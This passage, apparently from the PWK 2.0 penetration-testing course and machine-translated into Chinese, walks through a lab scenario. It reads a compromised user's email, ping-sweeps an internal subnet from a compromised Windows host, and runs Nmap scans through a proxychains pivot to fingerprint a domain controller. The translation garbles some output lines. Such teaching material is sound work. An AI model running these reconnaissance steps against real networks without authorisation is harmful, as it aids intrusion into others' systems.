<div style="position:absolute;top:9155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X 优先级：3</font></font></nobr></div>
<div style="position:absolute;top:9172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至：alex@sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:9189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/纯文本；</font><font style="vertical-align: inherit;">字符集=“iso-8859-1”</font></font></nobr></div>
<div style="position:absolute;top:9223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">亚历克斯，</font></font></nobr></div>
<div style="position:absolute;top:9240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我知道你不喜欢 Windows 10 但我们需要让每个人都过渡到某个时间</font></font></nobr></div>
<div style="position:absolute;top:9257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快点。</font><font style="vertical-align: inherit;">此外，你的盒子太旧了，我们甚至不知道上面运行的是什么，如果</font></font></nobr></div>
<div style="position:absolute;top:9274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它已更新或不再更新。</font></font></nobr></div>
<div style="position:absolute;top:9291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-罗杰</font></font></nobr></div>
<div style="position:absolute;top:9310;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 980 - 阅读 Alex 的电子邮件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9339;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们没有找到任何其他有趣的信息，我们将继续扫描整个</font></font></nobr></div>
<div style="position:absolute;top:9359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部网络，看看我们能不能找到新的东西。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:9396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7 内部网络枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:9438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始枚举内部网络之前，让我们回顾一下我们已经知道的：</font></font></nobr></div>
<div style="position:absolute;top:9470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们知道 Ajla 位于一个防火墙后面的外部网络中。</font><font style="vertical-align: inherit;">我们也知道 Zora 和 Poultry</font></font></nobr></div>
<div style="position:absolute;top:9490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在内部网络的另一个防火墙后面，但我们不知道内部网络是什么</font></font></nobr></div>
<div style="position:absolute;top:9509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">看起来像一个整体。</font><font style="vertical-align: inherit;">为了找出答案，我们必须运行扫描。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:9679;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="9"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 9 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:9712;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:10789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:10789;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:10789;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">818</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10105;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 351：具有未知内部网络的网络图</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了有效枚举内部网络，首先要开发一个扫描</font></font></nobr></div>
<div style="position:absolute;top:10155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法。</font><font style="vertical-align: inherit;">运行全端口扫描不是一种有效的方法。</font><font style="vertical-align: inherit;">如前所述，ICMP 主机</font></font></nobr></div>
<div style="position:absolute;top:10174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现不会通过代理链隧道工作。</font><font style="vertical-align: inherit;">相反，我们可以尝试发现什么</font></font></nobr></div>
<div style="position:absolute;top:10194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用受感染的 Windows 主机存在的主机，并使用该信息进行更多</font></font></nobr></div>
<div style="position:absolute;top:10213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">彻底扫描。</font></font></nobr></div>
<div style="position:absolute;top:10246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要做到这一点，我们可以写一个快速班轮到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping通</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用一切可能的主机在网络上</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></i></nobr></div>
<div style="position:absolute;top:10265;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">744</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用数字范围迭代命令，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/L</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志，它</font></font></nobr></div>
<div style="position:absolute;top:10284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受一个可替换的参数（</font><font style="vertical-align: inherit;">在我们的例子中为</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）和以格式迭代的数字</font></font></nobr></div>
<div style="position:absolute;top:10304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（开始，步骤，结束）</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">接下来，我们将为</font><font style="vertical-align: inherit;">每个主机</font><font style="vertical-align: inherit;">发送一个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n 1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 并设置一个短超时</font></font></nobr></div>
<div style="position:absolute;top:10323;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w 200</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志。</font><font style="vertical-align: inherit;">为了获得整洁的结果，ping 命令的输出将被重定向到</font></font></nobr></div>
<div style="position:absolute;top:10343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">null 接口（通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt; nul</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">最后，如果 ping 命令成功，我们会将 IP 回显到</font></font></nobr></div>
<div style="position:absolute;top:10362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表示主机已启动。</font><font style="vertical-align: inherit;">完整的命令和输出如清单 981 所示。</font></font></nobr></div>
<div style="position:absolute;top:10395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是请注意，这只会执行 ping 扫描。</font><font style="vertical-align: inherit;">这意味着我们不能假设</font></font></nobr></div>
<div style="position:absolute;top:10414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果是完整的，因为可能存在配置为不响应 ICMP 的实时主机</font></font></nobr></div>
<div style="position:absolute;top:10434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\poultryadmin&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i &gt; nul &amp;&amp; e</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:10485;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cho 10.5.5.%i 上升了。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.1 已上线。</font></font></nobr></div>
<div style="position:absolute;top:10520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.11 已上线。</font></font></nobr></div>
<div style="position:absolute;top:10537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.20 已上线。</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:10553;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.25 已上线。</font></font></b></nobr></div>
<div style="position:absolute;top:10570;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.30 已上线。</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10590;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 981 - Ping 扫描内部网络</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:10619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的扫描发现了五个主机，包括 10.5.5.1 网关，因此我们暂时可以忽略它。</font></font></nobr></div>
<div style="position:absolute;top:10638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来的两个我们已经妥协了（10.5.5.11 和 10.5.5.20）。</font><font style="vertical-align: inherit;">这还剩下两个主机</font></font></nobr></div>
<div style="position:absolute;top:10658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出于兴趣。</font><font style="vertical-align: inherit;">我们将对来自 Kali 的前 1000 个端口对两台主机进行 Nmap 扫描。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:10739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">744 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Jesus Costello, 2020), https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:10867;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:10900;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:11977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:11977;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:11977;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">819</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:10998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30 --open</font></font></font></b></nobr></div>
<div style="position:absolute;top:11015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:11032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 MST 2019-12-11 19:00 开始 Nmap 7.80 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:11049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.30:5900-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:11066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.25:5900-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:11083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.30:53-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:11100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:11116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.25:4321-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:11133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.30:667-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:11151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.25:667-&lt;--timeout</font></font></nobr></div>
<div style="position:absolute;top:11168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.30 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:11185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.80 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:11201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：988 个关闭端口</font></font></nobr></div>
<div style="position:absolute;top:11218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:11235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域</font></font></nobr></div>
<div style="position:absolute;top:11252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:11269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:11286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:11303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:11320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:11337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:11354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593/tcp 打开 http-rpc-epmap</font></font></nobr></div>
<div style="position:absolute;top:11371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636/tcp 打开 ldapssl</font></font></nobr></div>
<div style="position:absolute;top:11388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3268/tcp 打开 globalcatLDAP</font></font></nobr></div>
<div style="position:absolute;top:11405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3269/tcp 打开 globalcatLDAPssl</font></font></nobr></div>
<div style="position:absolute;top:11422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></nobr></div>
<div style="position:absolute;top:11456;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.25 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:11473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.80 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:11490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：996 个关闭端口</font></font></nobr></div>
<div style="position:absolute;top:11507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:11524;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:11541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:11558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:11575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8080/tcp 打开http-proxy</font></font></nobr></div>
<div style="position:absolute;top:11609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：1593.55 秒内扫描了 2 个 IP 地址（2 个主机）</font></font></nobr></div>
<div style="position:absolute;top:11628;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 982 - 两台主机的 Nmap 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11658;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描完成后，我们可以调查我们的结果。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11692;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.7.1</font></font></i></nobr></div>
<div style="position:absolute;top:11692;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们专注于 10.5.5.30。</font><font style="vertical-align: inherit;">乍一看，这似乎是域控制器</font></font></nobr></div>
<div style="position:absolute;top:11749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙盒.本地。</font><font style="vertical-align: inherit;">现在我们知道哪些端口是开放的，我们可以对这些端口进行更深入的扫描</font></font></nobr></div>
<div style="position:absolute;top:11769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口使用默认的 Nmap 脚本 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sC</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 以尝试提取更多信息。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/poultry$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains nmap -p53,88,135,139,389,445,464,593,636,3268,3269,33</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:11821;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">89 -sC -sT -Pn 10.5.5.30</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:11854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.5.5.30 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:11871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.29 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:11905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:11922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 开放域 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">820</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88/tcp 打开 kerberos-sec</font></font></nobr></div>
<div style="position:absolute;top:12200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">135/tcp 打开 msrpc</font></font></nobr></div>
<div style="position:absolute;top:12217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:12234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">389/tcp 打开 LDAP</font></font></nobr></div>
<div style="position:absolute;top:12252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445/tcp 打开 microsoft-ds</font></font></nobr></div>
<div style="position:absolute;top:12268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">464/tcp 打开 kpasswd5</font></font></nobr></div>
<div style="position:absolute;top:12285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">593/tcp 打开 http-rpc-epmap</font></font></nobr></div>
<div style="position:absolute;top:12302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636/tcp 打开 ldapssl</font></font></nobr></div>
<div style="position:absolute;top:12319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3268/tcp 打开 globalcatLDAP</font></font></nobr></div>
<div style="position:absolute;top:12336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3269/tcp 关闭 globalcatLDAPssl</font></font></nobr></div>
<div style="position:absolute;top:12353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3389/tcp 打开 ms-wbt-server</font></font></nobr></div>
<div style="position:absolute;top:12370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">rdp-ntlm-信息：</font></font></nobr></div>
<div style="position:absolute;top:12387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Target_Name：沙盒</font></font></nobr></div>
<div style="position:absolute;top:12404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS_Domain_Name：沙盒</font></font></nobr></div>
<div style="position:absolute;top:12421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS_Computer_Name: SANDBOXDC</font></font></nobr></div>
<div style="position:absolute;top:12438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">DNS_Domain_Name：sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">DNS_Computer_Name: SANDBOXDC.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">DNS_Tree_Name：sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12489;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">产品_版本：10.0.14393</font></font></nobr></div>
<div style="position:absolute;top:12506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_系统时间：2019-12-12T10:36:29+00:00</font></font></nobr></div>
<div style="position:absolute;top:12523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ssl-cert：主题：commonName=SANDBOXDC.sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:12540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">之前无效：2019-11-25T06:48:49</font></font></nobr></div>
<div style="position:absolute;top:12557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_之后无效：2020-05-26T06:48:49</font></font></nobr></div>
<div style="position:absolute;top:12574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ssl-日期：2019-12-12T10:36:28+00:00；</font><font style="vertical-align: inherit;">+8h00m01s 从扫描仪时间开始。</font></font></nobr></div>
<div style="position:absolute;top:12608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:12625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_clock-skew：平均值：9h36m01s，偏差：3h34m42s，中值：8h00m00s</font></font></nobr></div>
<div style="position:absolute;top:12642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-os-发现：</font></font></nobr></div>
<div style="position:absolute;top:12659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统：Windows Server 2016 Standard 14393（Windows Server 2016 Standard 6.3）</font></font></nobr></div>
<div style="position:absolute;top:12676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">计算机名称：SANDBOXDC</font></font></nobr></div>
<div style="position:absolute;top:12693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS 计算机名称：SANDBOXDC\x00</font></font></nobr></div>
<div style="position:absolute;top:12709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">域名：sandbox.local</font></font></nobr></div>
